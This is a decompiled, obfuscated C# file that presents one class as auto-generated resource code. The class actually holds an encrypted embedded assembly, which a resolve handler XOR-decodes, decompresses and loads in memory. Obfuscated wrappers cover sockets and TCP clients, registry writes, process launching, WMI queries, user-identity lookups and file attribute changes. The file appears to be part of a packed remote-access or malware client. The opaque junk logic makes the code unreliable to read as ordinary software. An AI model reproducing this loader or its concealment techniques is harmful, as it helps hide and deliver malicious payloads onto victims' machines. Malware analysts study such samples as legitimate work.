using System;
using System.CodeDom.Compiler;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.IO.Compression;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;
using System.Runtime.Serialization;
using System.Security.Policy;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Timers;
using Client.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic.MyServices;
using Microsoft.Win32;

namespace ns0;

[HideModuleName]
[GeneratedCode("System.Resources.Tools.StronglyTypedResourceBuilder", "4.0.0.0")]
[StandardModule]
internal sealed class Class5
{
	internal sealed class Class6
	{
		[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 574)]
		private struct Struct1
		{
		}

		internal static Struct1 struct1_0/* Not supported: data(FB 84 90 CB CC C1 CE CF D0 13 D6 EC EB 26 26 FB 78 99 1A 1C 1A DF BE 1E A8 D8 C6 54 D5 14 4A C6 14 82 92 A8 FD CA 82 4D 78 77 54 82 76 74 67 49 42 68 58 95 7E 4F 5C 61 1E 3F CB 01 16 EF 04 16 21 D7 08 2D D2 CF C5 30 E0 13 3C 2D 1E FF 48 78 77 CE 50 8F D0 5D 09 59 66 7E 24 45 62 AC 3F CC 7A 09 8C 55 0C 0D 3C 8B 16 95 F2 4B FE 7C 54 61 DF 7D 5E 6F 1C 57 62 5F EC A7 0A 91 82 83 82 4A 18 09 5A 48 40 6D 5E 45 50 B1 92 D5 9C 8F D8 D6 6C 98 57 96 5B 7A D7 3F F5 9D E6 27 A1 A3 A6 1D 27 AA 23 60 AD 49 D5 8F 41 44 F8 E1 9F FF 36 C3 B2 AA FE 96 0E E2 2F 33 88 11 E9 89 09 0C 89 41 72 08 CB 61 4A C0 0D 46 9E 35 EA C2 78 82 DF 95 A3 59 57 BD B9 3D 8E BB 80 19 E1 87 D7 A7 03 E4 FC F9 83 69 F4 5D EB 67 3F 6C 88 4C FB 51 89 D5 E8 1E FE AC EA 6A 5A 19 EA 04 A7 15 E3 92 10 22 AF 1F C9 52 4D A4 87 26 B9 54 28 19 AD D0 DF EE 5D 20 83 52 26 17 7F B6 65 E4 BB DA 5D 93 60 5D 2E 09 82 88 CC 71 B4 7C 62 6B A6 59 AF A2 6C 6D 6A AD A2 98 9F 2D 6E A5 D4 D2 DB AF D9 1F 5F D5 D7 D4 D0 2C D7 29 20 D1 38 CB 3E 39 32 3D 3F 3B CA 33 3A 3A F5 D1 37 06 09 3F 2B 05 0A 4F 2A 47 50 DC 6E 52 E0 6E 72 32 30 79 96 15 D3 15 59 50 3E D1 D5 3A 1D 20 78 0D 04 28 03 3A 15 BC CE 03 11 A8 88 C3 2A 8D 3F FD 8D 92 51 8D B4 F8 96 F5 9F 0E 8E FE 7A 38 89 1C F4 1D C3 23 00 8E C3 50 F8 E6 BD 1F 9C AC F4 66 75 BB B8 E0 24 44 09 AF 35 A0 7E 9B 5D 36 32 FE E4 E2 9E 44 EE 4F CE E4 42 A0 7A 1F 04 05 CE 80 19 1F EB 4A 7D AC F3 AD 71 CC 73 D7 D3 46 E8 DF 11 B3 5F 64 A9 AE F8 D1 C5 EF 4C F5 84 A5 DE 37 08 17 55 67 12 51 2C 76 04 4F 18 B7 8F 2A 4D 81 A7 18 09 57 7D A9 02 71 C6 DB 5B 49 94 E3 89 9D DF 41 93 90 06 23 C7 6F FF E5 38 8C 80 01 C1 DB EC 1D 24 53 78 83 80 CD 8D CD CE AB C9 D3 85 1D 18 09 52 04 58 21 3A 39 98 39 73 6A 35 7B 3D D2 D0 10 72 53 44 45) */;

		internal static Assembly smethod_0(object object_0, ResolveEventArgs resolveEventArgs_0)
		{
			return (Assembly)smethod_1(54, null, 574, resolveEventArgs_0, "c1281071-a474-4492-a680-81f0a6923207");
		}

		internal static object smethod_1(int int_0, Assembly assembly_0, int int_1, object object_0, string string_0)
		{
			//IL_0043: Unknown result type (might be due to invalid IL or missing references)
			//IL_004a: Expected O, but got Unknown
			if (int_1 > 0)
			{
				Assembly gparam_ = (Assembly)(ISerializable)Class5.smethod_0('ϴ', 896);
				ResolveEventArgs gparam_2 = (ResolveEventArgs)object_0;
				string gparam_3 = MyApplication.smethod_2(string_0, "-F3E4", 68, 68);
				AppDomain gparam_4 = (AppDomain)(_AppDomain)MyApplication.smethod_3('\u0089', '¥');
				Dictionary<string, string> dictionary = (Dictionary<string, string>)Class7.smethod_1(gparam_4, string_0, 468, 451);
				Assembly assembly;
				if (dictionary == null)
				{
					dictionary = new Dictionary<string, string>();
					smethod_3(gparam_4, string_0, (object)dictionary, (short)13, (short)113);
					byte[] array = new byte[574]
					{
						251, 132, 144, 203, 204, 193, 206, 207, 208, 19,
						214, 236, 235, 38, 38, 251, 120, 153, 26, 28,
						26, 223, 190, 30, 168, 216, 198, 84, 213, 20,
						74, 198, 20, 130, 146, 168, 253, 202, 130, 77,
						120, 119, 84, 130, 118, 116, 103, 73, 66, 104,
						88, 149, 126, 79, 92, 97, 30, 63, 203, 1,
						22, 239, 4, 22, 33, 215, 8, 45, 210, 207,
						197, 48, 224, 19, 60, 45, 30, 255, 72, 120,
						119, 206, 80, 143, 208, 93, 9, 89, 102, 126,
						36, 69, 98, 172, 63, 204, 122, 9, 140, 85,
						12, 13, 60, 139, 22, 149, 242, 75, 254, 124,
						84, 97, 223, 125, 94, 111, 28, 87, 98, 95,
						236, 167, 10, 145, 130, 131, 130, 74, 24, 9,
						90, 72, 64, 109, 94, 69, 80, 177, 146, 213,
						156, 143, 216, 214, 108, 152, 87, 150, 91, 122,
						215, 63, 245, 157, 230, 39, 161, 163, 166, 29,
						39, 170, 35, 96, 173, 73, 213, 143, 65, 68,
						248, 225, 159, 255, 54, 195, 178, 170, 254, 150,
						14, 226, 47, 51, 136, 17, 233, 137, 9, 12,
						137, 65, 114, 8, 203, 97, 74, 192, 13, 70,
						158, 53, 234, 194, 120, 130, 223, 149, 163, 89,
						87, 189, 185, 61, 142, 187, 128, 25, 225, 135,
						215, 167, 3, 228, 252, 249, 131, 105, 244, 93,
						235, 103, 63, 108, 136, 76, 251, 81, 137, 213,
						232, 30, 254, 172, 234, 106, 90, 25, 234, 4,
						167, 21, 227, 146, 16, 34, 175, 31, 201, 82,
						77, 164, 135, 38, 185, 84, 40, 25, 173, 208,
						223, 238, 93, 32, 131, 82, 38, 23, 127, 182,
						101, 228, 187, 218, 93, 147, 96, 93, 46, 9,
						130, 136, 204, 113, 180, 124, 98, 107, 166, 89,
						175, 162, 108, 109, 106, 173, 162, 152, 159, 45,
						110, 165, 212, 210, 219, 175, 217, 31, 95, 213,
						215, 212, 208, 44, 215, 41, 32, 209, 56, 203,
						62, 57, 50, 61, 63, 59, 202, 51, 58, 58,
						245, 209, 55, 6, 9, 63, 43, 5, 10, 79,
						42, 71, 80, 220, 110, 82, 224, 110, 114, 50,
						48, 121, 150, 21, 211, 21, 89, 80, 62, 209,
						213, 58, 29, 32, 120, 13, 4, 40, 3, 58,
						21, 188, 206, 3, 17, 168, 136, 195, 42, 141,
						63, 253, 141, 146, 81, 141, 180, 248, 150, 245,
						159, 14, 142, 254, 122, 56, 137, 28, 244, 29,
						195, 35, 0, 142, 195, 80, 248, 230, 189, 31,
						156, 172, 244, 102, 117, 187, 184, 224, 36, 68,
						9, 175, 53, 160, 126, 155, 93, 54, 50, 254,
						228, 226, 158, 68, 238, 79, 206, 228, 66, 160,
						122, 31, 4, 5, 206, 128, 25, 31, 235, 74,
						125, 172, 243, 173, 113, 204, 115, 215, 211, 70,
						232, 223, 17, 179, 95, 100, 169, 174, 248, 209,
						197, 239, 76, 245, 132, 165, 222, 55, 8, 23,
						85, 103, 18, 81, 44, 118, 4, 79, 24, 183,
						143, 42, 77, 129, 167, 24, 9, 87, 125, 169,
						2, 113, 198, 219, 91, 73, 148, 227, 137, 157,
						223, 65, 147, 144, 6, 35, 199, 111, 255, 229,
						56, 140, 128, 1, 193, 219, 236, 29, 36, 83,
						120, 131, 128, 205, 141, 205, 206, 171, 201, 211,
						133, 29, 24, 9, 82, 4, 88, 33, 58, 57,
						152, 57, 115, 106, 53, 123, 61, 210, 208, 16,
						114, 83, 68, 69
					};
					for (int num = int_1 - 1; num >= 0; num--)
					{
						array[num] ^= (byte)((num + int_1 - int_0) & 0xFF);
					}
					Stream stream = new MemoryStream();
					using (Stream gparam_5 = new DeflateStream(new MemoryStream(array), CompressionMode.Decompress, leaveOpen: true))
					{
						byte[] array2 = new byte[1024];
						int int_2;
						while ((int_2 = MyComputer.smethod_2(gparam_5, array2, 0, array2.Length, 568, 547)) > 0)
						{
							Class5.smethod_2(stream, array2, 0, int_2, '\u0337', 793);
						}
					}
					assembly = MyApplication.smethod_5(Class7.smethod_3((MemoryStream)stream, 'Ì', 236), null, smethod_5(gparam_, '\u02dd', '\u02f2'), '\u0001', '\u001c');
					smethod_3(gparam_4, gparam_3, (object)assembly, (short)761, (short)645);
					string[] array3 = Class7.smethod_5(assembly, 1002, 1006);
					foreach (string text in array3)
					{
						dictionary[text] = text;
					}
				}
				else
				{
					assembly = (Assembly)Class11.smethod_1(gparam_4, gparam_3, 578, 'ɰ');
				}
				if (dictionary.ContainsKey(Class16.smethod_1(gparam_2, 614, 521)))
				{
					return assembly;
				}
			}
			return null;
		}

		internal static bool smethod_2<T>(T gparam_0, short short_0, int int_0) where T : WeakReference
		{
			int num = 0;
			bool result;
			do
			{
				result = (((short_0 ^ int_0) - 86) ^ num) switch
				{
					0 => Class11.Class15.smethod_3((WeakReference)gparam_0, 'Ñ', (short)138), 
					_ => false, 
				};
				num++;
			}
			while ((short_0 * short_0 + short_0) % 2 != 0);
			return result;
		}

		internal static void smethod_3<T, U, V>(T gparam_0, V gparam_1, U gparam_2, short short_0, short short_1) where T : AppDomain where V : string
		{
			int num = 0;
			switch (((short_0 ^ short_1) - 124) ^ 0)
			{
			case 0:
				Class11.Class12.Class14.smethod_0((AppDomain)gparam_0, (string)gparam_1, (object)gparam_2, 590, 521);
				break;
			}
			num++;
		}

		internal static void smethod_4(int int_0, short short_0)
		{
			int num = 0;
			int num2;
			do
			{
				switch (((int_0 ^ short_0) - 121) ^ num)
				{
				case 2:
					Class11.smethod_2('ɻ', 'ɛ');
					break;
				case 1:
					Class11.smethod_2('\u02db', '\u02c4');
					break;
				case 0:
					Class11.smethod_2('φ', 'Ϙ');
					break;
				}
				num++;
				num2 = short_0 * short_0;
				num2 = short_0 + num2;
			}
			while (num2 % 2 != 0);
		}

		internal static Evidence smethod_5<T>(T gparam_0, char char_0, char char_1) where T : Assembly
		{
			int num = 0;
			Evidence result = (((char_1 ^ char_0) - 47) ^ 0) switch
			{
				0 => Class11.smethod_8((Assembly)gparam_0, 437, 511), 
				_ => null, 
			};
			num++;
			return result;
		}

		internal static void smethod_6<T>(T gparam_0, int int_0, short short_0) where T : Thread
		{
			int num = 0;
			int num2;
			do
			{
				switch (((int_0 ^ short_0) - 21) ^ num)
				{
				case 0:
					Class16.smethod_5((Thread)gparam_0, 668, (short)734);
					break;
				}
				num++;
				num2 = short_0 * short_0;
				num2 = short_0 + num2;
			}
			while (num2 % 2 != 0);
		}

		internal static Socket smethod_7<T>(T gparam_0, int int_0, short short_0) where T : TcpClient
		{
			int num = 0;
			Socket result = (((int_0 ^ short_0) - 3) ^ 0) switch
			{
				0 => (Socket)(IDisposable)Class11.Class15.smethod_6((TcpClient)gparam_0, 124, 'w'), 
				_ => null, 
			};
			num++;
			return result;
		}

		internal static long smethod_8<T>(T gparam_0, int int_0, char char_0) where T : MemoryStream
		{
			int num = 0;
			long result = (((char_0 ^ int_0) - 18) ^ 0) switch
			{
				0 => Class11.Class15.smethod_7((MemoryStream)gparam_0, 'Ώ', 1001), 
				_ => 4L, 
			};
			num++;
			return result;
		}

		internal static int smethod_9<T>(T gparam_0, short short_0, int int_0) where T : TcpClient
		{
			int num = 0;
			int result = (((short_0 ^ int_0) - 10) ^ 0) switch
			{
				0 => Class11.Class15.smethod_8((TcpClient)gparam_0, 568, (short)516), 
				_ => 9, 
			};
			num++;
			return result;
		}

		internal static bool smethod_10<T, U>(T gparam_0, U gparam_1, int int_0, char char_0) where T : string where U : string
		{
			int num = 0;
			bool result;
			int num2;
			do
			{
				result = (((int_0 ^ char_0) - 77) ^ num) switch
				{
					0 => Class11.smethod_14((string)gparam_0, (string)gparam_1, 'ú', 190), 
					_ => false, 
				};
				num++;
				num2 = char_0 * char_0;
				num2 = char_0 + num2;
			}
			while (num2 % 2 != 0);
			return result;
		}

		internal static object smethod_11<T>(T gparam_0, object[] object_0, string[] string_0, short short_0, int int_0)
		{
			int num = 0;
			object result;
			int num2;
			do
			{
				result = (((int_0 ^ short_0) - 1) ^ num) switch
				{
					0 => Class16.smethod_3((object)gparam_0, object_0, string_0, '\u008a', 151), 
					_ => null, 
				};
				num++;
				num2 = short_0 * short_0;
				num2 = short_0 + num2;
			}
			while (num2 % 2 != 0);
			return result;
		}

		internal static string smethod_12(int int_0, short short_0)
		{
			int num = 0;
			string result = (((short_0 ^ int_0) - 74) ^ 0) switch
			{
				0 => (string)(IComparable)Class11.Class15.smethod_9(1010, 'χ'), 
				1 => (string)(IComparable)Class11.Class15.smethod_9(452, 'ǲ'), 
				2 => (string)(IComparable)Class11.Class15.smethod_9(919, 'Π'), 
				3 => (string)(IComparable)Class11.Class15.smethod_9(594, 'ɪ'), 
				4 => (string)(IComparable)Class11.Class15.smethod_9(560, 'ȉ'), 
				_ => null, 
			};
			num++;
			return result;
		}

		internal static Process smethod_13<T>(T gparam_0, char char_0, char char_1) where T : string
		{
			int num = 0;
			Process result = (((char_1 ^ char_0) - 59) ^ 0) switch
			{
				0 => (Process)(Component)Class11.Class12.smethod_3((string)gparam_0, 969, 'Ϧ'), 
				_ => null, 
			};
			num++;
			return result;
		}

		internal static void smethod_14<T, U, V>(T gparam_0, U gparam_1, V gparam_2, int int_0, short short_0) where T : RegistryKey where U : string
		{
			int num = 0;
			do
			{
				switch (((short_0 ^ int_0) - 24) ^ num)
				{
				case 0:
					Class11.Class12.smethod_5((RegistryKey)gparam_0, (string)gparam_1, (object)gparam_2, (short)306, 257);
					break;
				}
				num++;
			}
			while ((short_0 * short_0 + short_0) % 2 != 0);
		}

		internal static double smethod_15<T>(T gparam_0, short short_0, short short_1) where T : string
		{
			int num = 0;
			double result;
			int num2;
			do
			{
				result = (((short_1 ^ short_0) - 1) ^ num) switch
				{
					0 => Class11.Class12.smethod_6((string)gparam_0, 644, (short)740), 
					_ => 0.44635773165791687, 
				};
				num++;
				num2 = short_1 * short_1;
				num2 = short_1 + num2;
			}
			while (num2 % 2 != 0);
			return result;
		}

		internal static WindowsIdentity smethod_16(int int_0, char char_0)
		{
			int num = 0;
			WindowsIdentity result;
			int num2;
			do
			{
				result = (((int_0 ^ char_0) - 57) ^ num) switch
				{
					0 => (WindowsIdentity)(IDisposable)Class11.Class12.smethod_7(820, 877), 
					_ => null, 
				};
				num++;
				num2 = char_0 * char_0;
				num2 = char_0 + num2;
			}
			while (num2 % 2 != 0);
			return result;
		}

		internal static void smethod_17<T>(T gparam_0, short short_0, short short_1) where T : string
		{
			int num = 0;
			switch (((short_0 ^ short_1) - 126) ^ 0)
			{
			case 0:
				Class16.smethod_8((string)gparam_0, '\u033a', (short)821);
				break;
			}
			num++;
		}

		internal static object smethod_18<T, U>(T gparam_0, U gparam_1, short short_0, int int_0) where T : ManagementBaseObject where U : string
		{
			int num = 0;
			object result;
			do
			{
				result = (((short_0 ^ int_0) - 89) ^ num) switch
				{
					0 => Class16.smethod_9<ManagementBaseObject, string>((ManagementBaseObject)(object)gparam_0, (string)gparam_1, (short)957, (short)921), 
					_ => null, 
				};
				num++;
			}
			while ((short_0 * short_0 + short_0) % 2 != 0);
			return result;
		}

		internal static string smethod_19<T>(T gparam_0, byte[] byte_0, short short_0, int int_0) where T : Encoding
		{
			int num = 0;
			string result;
			do
			{
				result = (((int_0 ^ short_0) - 47) ^ num) switch
				{
					0 => Class11.smethod_18((Encoding)gparam_0, byte_0, (short)513, (short)585), 
					_ => null, 
				};
				num++;
			}
			while ((short_0 * short_0 + short_0) % 2 != 0);
			return result;
		}

		internal static string smethod_20<T>(T gparam_0, char char_0, char char_1) where T : DriveInfo
		{
			int num = 0;
			string result = (((char_1 ^ char_0) - 111) ^ 0) switch
			{
				0 => Class16.smethod_10((DriveInfo)gparam_0, (short)9, 59), 
				_ => null, 
			};
			num++;
			return result;
		}

		internal static void smethod_21<T, U, V>(V gparam_0, U gparam_1, T gparam_2, short short_0, int int_0) where T : string where U : string where V : FileSystemProxy
		{
			int num = 0;
			switch (((short_0 ^ int_0) - 103) ^ 0)
			{
			case 0:
				Class11.smethod_20<string, string, FileSystemProxy>((FileSystemProxy)(object)gparam_0, (string)gparam_1, (string)gparam_2, (short)1017, 'ί');
				break;
			}
			num++;
		}

		internal static bool smethod_22<T, U>(T gparam_0, U gparam_1, char char_0, char char_1) where T : FileSystemProxy where U : string
		{
			int num = 0;
			bool result = (((char_1 ^ char_0) - 1) ^ 0) switch
			{
				0 => Class11.smethod_23<string, FileSystemProxy>((FileSystemProxy)(object)gparam_0, (string)gparam_1, 152, 241), 
				_ => true, 
			};
			num++;
			return result;
		}

		internal static void smethod_23<T, U, V>(U gparam_0, T gparam_1, V gparam_2, object[] object_0, string[] string_0, Type[] type_0, bool bool_0, bool bool_1, short short_0, int int_0) where T : Type where V : string
		{
			int num = 0;
			switch (((int_0 ^ short_0) - 39) ^ 0)
			{
			case 0:
				Class11.Class15.smethod_14((object)gparam_0, (Type)gparam_1, (string)gparam_2, object_0, string_0, type_0, bool_0, bool_1, '\u0005', (short)96);
				break;
			}
			num++;
		}

		internal static int smethod_24<T>(T gparam_0, int int_0, short short_0, int int_1) where T : Array
		{
			int num = 0;
			int result;
			int num2;
			do
			{
				result = (((int_1 ^ short_0) - 61) ^ num) switch
				{
					0 => Class11.Class15.smethod_15((Array)gparam_0, int_0, 'Ę', (short)285), 
					_ => 2, 
				};
				num++;
				num2 = short_0 * short_0;
				num2 = short_0 + num2;
			}
			while (num2 % 2 != 0);
			return result;
		}

		internal static object smethod_25<T, U>(U gparam_0, T gparam_1, char char_0, int int_0)
		{
			int num = 0;
			object result;
			do
			{
				result = (((int_0 ^ char_0) - 45) ^ num) switch
				{
					0 => Class11.Class15.smethod_16((object)gparam_0, (object)gparam_1, (short)823, '\u0321'), 
					_ => null, 
				};
				num++;
			}
			while ((char_0 * char_0 + char_0) % 2 != 0);
			return result;
		}
	}

	internal sealed class Class7
	{
		internal static object smethod_0<T>(T gparam_0, short short_0, int int_0)
		{
			int num = 0;
			object result;
			do
			{
				result = (((short_0 ^ int_0) - 111) ^ num) switch
				{
					0 => Class11.Class12.Class14.smethod_9((object)gparam_0, (short)448, (short)403), 
					_ => null, 
				};
				num++;
			}
			while ((short_0 * short_0 + short_0) % 2 != 0);
			return result;
		}

		internal static object smethod_1<T, U>(T gparam_0, U gparam_1, short short_0, int int_0) where T : AppDomain where U : string
		{
			int num = 0;
			object result = (((short_0 ^ int_0) - 23) ^ 0) switch
			{
				0 => Class11.smethod_1((AppDomain)gparam_0, (string)gparam_1, 695, 'ʅ'), 
				_ => null, 
			};
			num++;
			return result;
		}

		internal static void smethod_2<T>(T gparam_0, int int_0, int int_1) where T : TcpClient
		{
			int num = 0;
			switch (((int_1 ^ int_0) - 106) ^ 0)
			{
			case 0:
				Class16.smethod_11((TcpClient)gparam_0, (short)79, (short)51);
				break;
			}
			num++;
		}

		internal static byte[] smethod_3<T>(T gparam_0, char char_0, int int_0) where T : MemoryStream
		{
			int num = 0;
			byte[] result;
			do
			{
				result = (((int_0 ^ char_0) - 32) ^ num) switch
				{
					1 => (byte[])(ICollection)Class16.smethod_12((MemoryStream)gparam_0, 735, 'ˉ'), 
					0 => (byte[])(ICollection)Class16.smethod_12((MemoryStream)gparam_0, 631, 'ɡ'), 
					_ => null, 
				};
				num++;
			}
			while ((char_0 * char_0 + char_0) % 2 != 0);
			return result;
		}

		internal static void smethod_4<T, U>(T gparam_0, U gparam_1, int int_0, short short_0, int int_1) where T : TcpClient where U : string
		{
			int num = 0;
			int num2;
			do
			{
				switch (((int_1 ^ short_0) - 47) ^ num)
				{
				case 0:
					Class11.Class12.Class14.smethod_13((TcpClient)gparam_0, (string)gparam_1, int_0, (short)635, 'Ʉ');
					break;
				}
				num++;
				num2 = short_0 * short_0;
				num2 = short_0 + num2;
			}
			while (num2 % 2 != 0);
		}

		internal static string[] smethod_5<T>(T gparam_0, short short_0, int int_0) where T : Assembly
		{
			int num = 0;
			string[] result;
			int num2;
			do
			{
				result = (((short_0 ^ int_0) - 4) ^ num) switch
				{
					0 => (string[])(IEnumerable)Class11.Class12.Class14.smethod_14((Assembly)gparam_0, 'ř', 'ľ'), 
					_ => null, 
				};
				num++;
				num2 = short_0 * short_0;
				num2 = short_0 + num2;
			}
			while (num2 % 2 != 0);
			return result;
		}

		internal static void smethod_6<T>(T gparam_0, byte[] byte_0, int int_0, int int_1, int int_2, int int_3) where T : MemoryStream
		{
			int num = 0;
			switch (((int_3 ^ int_2) - 110) ^ 0)
			{
			case 0:
				Class11.Class15.smethod_4((MemoryStream)gparam_0, byte_0, int_0, int_1, 'L', (short)110);
				break;
			}
			num++;
		}

		internal static bool smethod_7<T>(T gparam_0, short short_0, char char_0) where T : Socket
		{
			int num = 0;
			bool result;
			do
			{
				result = (((short_0 ^ char_0) - 9) ^ num) switch
				{
					0 => Class11.Class15.smethod_17((Socket)gparam_0, 513, 'ɒ'), 
					_ => false, 
				};
				num++;
			}
			while ((char_0 * char_0 + char_0) % 2 != 0);
			return result;
		}

		internal static int smethod_8<T>(T gparam_0, short short_0, char char_0) where T : Array
		{
			int num = 0;
			int result;
			do
			{
				result = (((char_0 ^ short_0) - 88) ^ num) switch
				{
					0 => Class11.Class15.smethod_18((Array)gparam_0, 334, 256), 
					_ => 10, 
				};
				num++;
			}
			while ((short_0 * short_0 + short_0) % 2 != 0);
			return result;
		}

		internal static int smethod_9<T, U>(U gparam_0, T gparam_1, bool bool_0, char char_0, int int_0) where T : string where U : string
		{
			int num = 0;
			int result = (((char_0 ^ int_0) - 12) ^ 0) switch
			{
				0 => Class11.smethod_12((string)gparam_0, (string)gparam_1, bool_0, 'ž', 'Ŋ'), 
				_ => int_0, 
			};
			num++;
			return result;
		}

		internal static string smethod_10<T, U, V, W>(W gparam_0, V gparam_1, T gparam_2, U gparam_3, char char_0, int int_0) where T : string where U : string where V : string where W : string
		{
			int num = 0;
			string result = (((char_0 ^ int_0) - 82) ^ 0) switch
			{
				0 => (string)(IComparable<string>)Class11.Class15.smethod_19((string)gparam_0, (string)gparam_1, (string)gparam_2, (string)gparam_3, (short)140, '\u00b4'), 
				_ => null, 
			};
			num++;
			return result;
		}

		internal static void smethod_11<T>(T gparam_0, FileAttributes fileAttributes_0, char char_0, short short_0) where T : string
		{
			int num = 0;
			do
			{
				switch (((char_0 ^ short_0) - 47) ^ num)
				{
				case 0:
					Class11.Class12.Class14.smethod_15((string)gparam_0, fileAttributes_0, (short)351, 305);
					break;
				}
				num++;
			}
			while ((char_0 * char_0 + char_0) % 2 != 0);
		}

		internal static string[] smethod_12<T, U>(T gparam_0, U gparam_1, int int_0, CompareMethod compareMethod_0, char char_0, int int_1) where T : string where U : string
		{
			//IL_0025: Unknown result type (might be due to invalid IL or missing references)
			int num = 0;
			string[] result = (((int_1 ^ char_0) - 2) ^ 0) switch
			{
				0 => (string[])(IEnumerable)Class11.smethod_24((string)gparam_0, (string)gparam_1, int_0, compareMethod_0, '\u02ea', (short)703), 
				_ => null, 
			};
			num++;
			return result;
		}

		internal static OperatingSystem smethod_13(short short_0, char char_0)
		{
			int num = 0;
			OperatingSystem result;
			do
			{
				result = (((short_0 ^ char_0) - 101) ^ num) switch
				{
					0 => Class11.Class12.Class14.smethod_16(964, 1009), 
					_ => null, 
				};
				num++;
			}
			while ((char_0 * char_0 + char_0) % 2 != 0);
			return result;
		}

		internal static void smethod_14<T, U>(U gparam_0, T gparam_1, char char_0, int int_0) where T : string where U : TextWriter
		{
			int num = 0;
			do
			{
				switch (((char_0 ^ int_0) - 104) ^ num)
				{
				case 0:
					Class11.Class15.smethod_21((TextWriter)gparam_0, (string)gparam_1, (short)325, 'Œ');
					break;
				}
				num++;
			}
			while ((char_0 * char_0 + char_0) % 2 != 0);
		}

		internal static IPAddress smethod_15<T>(T gparam_0, char char_0, short short_0) where T : string
		{
			int num = 0;
			IPAddress result;
			do
			{
				result = (((short_0 ^ char_0) - 118) ^ num) switch
				{
					0 => Class11.Class12.Class14.smethod_17((string)gparam_0, 676, 646), 
					_ => null, 
				};
				num++;
			}
			while ((short_0 * short_0 + short_0) % 2 != 0);
			return result;
		}

		internal static DriveType smethod_16<T>(T gparam_0, int int_0, short short_0) where T : DriveInfo
		{
			int num = 0;
			DriveType result;
			int num2;
			do
			{
				result = (((short_0 ^ int_0) - 74) ^ num) switch
				{
					0 => Class11.Class12.smethod_14((DriveInfo)gparam_0, '\u0095', 170), 
					_ => DriveType.Unknown, 
				};
				num++;
				num2 = short_0 * short_0;
				num2 = short_0 + num2;
			}
			while (num2 % 2 != 0);
			return result;
		}

		internal static int smethod_17<T, U>(T gparam_0, U gparam_1, CompareMethod compareMethod_0, int int_0, int int_1) where T : string where U : string
		{
			//IL_0024: Unknown result type (might be due to invalid IL or missing references)
			int num = 0;
			int result = (((int_0 ^ int_1) - 75) ^ 0) switch
			{
				0 => Class11.Class12.Class14.smethod_18((string)gparam_0, (string)gparam_1, compareMethod_0, (short)170, 153), 
				_ => 5, 
			};
			num++;
			return result;
		}

		internal static string[] smethod_18<T>(T gparam_0, char char_0, char char_1) where T : string
		{
			int num = 0;
			string[] result = (((char_1 ^ char_0) - 26) ^ 0) switch
			{
				0 => Class11.smethod_25((string)gparam_0, 735, 759), 
				_ => null, 
			};
			num++;
			return result;
		}
	}

	private static ResourceManager resourceManager_0;

	private static CultureInfo cultureInfo_0;

	[EditorBrowsable(EditorBrowsableState.Advanced)]
	internal static ResourceManager ResourceManager_0
	{
		get
		{
			if (MyApplication.smethod_6<object, object>(resourceManager_0, null, 63, 19))
			{
				ResourceManager resourceManager = (resourceManager_0 = new ResourceManager("Ⴓ.ႣႳ", smethod_3(typeof(Class5), ' ', 'c')));
			}
			return resourceManager_0;
		}
	}

	[EditorBrowsable(EditorBrowsableState.Advanced)]
	internal static CultureInfo CultureInfo_0
	{
		get
		{
			return cultureInfo_0;
		}
		set
		{
			cultureInfo_0 = value;
		}
	}

	static Class5()
	{
		MyApplication.smethod_0();
	}

	internal static Assembly smethod_0(char char_0, int int_0)
	{
		int num = 0;
		Assembly result;
		int num2;
		do
		{
			result = (((int_0 ^ char_0) - 116) ^ num) switch
			{
				0 => (Assembly)(ICustomAttributeProvider)Class16.smethod_13(910, 921), 
				_ => null, 
			};
			num++;
			num2 = char_0 * char_0;
			num2 = char_0 + num2;
		}
		while (num2 % 2 != 0);
		return result;
	}

	internal static void smethod_1<T>(T gparam_0, short short_0, short short_1) where T : Exception
	{
		int num = 0;
		do
		{
			switch (((short_0 ^ short_1) - 41) ^ num)
			{
			case 0:
				Class11.Class12.smethod_1((Exception)gparam_0, 990, (short)963);
				break;
			}
			num++;
		}
		while ((short_1 * short_1 + short_1) % 2 != 0);
	}

	internal static void smethod_2<T>(T gparam_0, byte[] byte_0, int int_0, int int_1, char char_0, int int_2) where T : Stream
	{
		int num = 0;
		do
		{
			switch (((int_2 ^ char_0) - 46) ^ num)
			{
			case 0:
				Class11.smethod_26((Stream)gparam_0, byte_0, int_0, int_1, (short)273, (short)316);
				break;
			}
			num++;
		}
		while ((char_0 * char_0 + char_0) % 2 != 0);
	}

	internal static Assembly smethod_3<T>(T gparam_0, char char_0, char char_1) where T : Type
	{
		int num = 0;
		Assembly result = (((char_0 ^ char_1) - 67) ^ 0) switch
		{
			0 => Class16.smethod_14((Type)gparam_0, 'ά', (short)950), 
			_ => null, 
		};
		num++;
		return result;
	}

	internal static int smethod_4<T>(T gparam_0, char char_0, char char_1) where T : string
	{
		int num = 0;
		int result;
		do
		{
			result = (((char_1 ^ char_0) - 2) ^ num) switch
			{
				2 => Class11.smethod_15((string)gparam_0, 556, 'ɳ'), 
				1 => Class11.smethod_15((string)gparam_0, 314, 'ŧ'), 
				0 => Class11.smethod_15((string)gparam_0, 183, 'é'), 
				_ => 1, 
			};
			num++;
		}
		while ((char_0 * char_0 + char_0) % 2 != 0);
		return result;
	}

	internal static int smethod_5<T>(T gparam_0, int int_0, int int_1) where T : Socket
	{
		int num = 0;
		int result = (((int_0 ^ int_1) - 56) ^ 0) switch
		{
			0 => Class11.Class12.Class14.smethod_19((Socket)gparam_0, 6, 31), 
			_ => int_1, 
		};
		num++;
		return result;
	}

	internal static int smethod_6<T>(T gparam_0, byte[] byte_0, int int_0, int int_1, SocketFlags socketFlags_0, int int_2, char char_0) where T : Socket
	{
		int num = 0;
		int result = (((char_0 ^ int_2) - 26) ^ 0) switch
		{
			0 => Class11.smethod_4((Socket)gparam_0, byte_0, int_0, int_1, socketFlags_0, 725, 675), 
			_ => 9, 
		};
		num++;
		return result;
	}

	internal static void smethod_7<T>(T gparam_0, char char_0, char char_1) where T : Stream
	{
		int num = 0;
		int num2;
		do
		{
			switch (((char_0 ^ char_1) - 82) ^ num)
			{
			case 0:
				Class11.Class12.smethod_13((Stream)gparam_0, (short)147, '¾');
				break;
			}
			num++;
			num2 = char_0 * char_0;
			num2 = char_0 + num2;
		}
		while (num2 % 2 != 0);
	}

